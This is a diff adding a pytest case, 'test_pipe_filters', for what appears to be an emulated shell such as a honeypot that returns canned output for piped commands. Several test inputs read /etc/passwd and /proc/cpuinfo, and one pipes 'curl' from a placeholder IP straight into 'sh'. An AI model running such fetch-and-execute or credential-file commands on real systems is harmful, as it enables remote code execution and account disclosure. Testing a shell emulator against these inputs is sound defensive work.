@@ -66,3 +66,14 @@ def test_stderr_redirects_are_ignored():
     assert shell.execute("uname -s 2>&1")[0] == "Linux\n"
     assert shell.execute("echo a>/tmp/b; cat /tmp/b")[0] == "a\n"
     assert shell.execute("echo c >> /tmp/b; cat /tmp/b")[0] == "a\nc\n"
+
+
+def test_pipe_filters():
+    shell, _ = make_shell()
+    assert shell.execute("cat /etc/os-release | head -2")[0] == 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nNAME="Ubuntu"\n'
+    assert shell.execute("cat /etc/passwd | grep root")[0] == "root:x:0:0:root:/root:/bin/bash\n"
+    assert shell.execute("cat /etc/passwd | grep -c bash")[0] == "3\n"
+    assert shell.execute("cat /etc/passwd | wc -l")[0] == "9\n"
+    assert shell.execute("cat /etc/passwd | tail -n 1")[0].startswith("deploy:")
+    assert shell.execute("cat /proc/cpuinfo | grep -i 'MODEL NAME' | head -1")[0].startswith("model name")
+    assert shell.execute("curl -s http://203.0.113.9/x | sh")[0] == ""
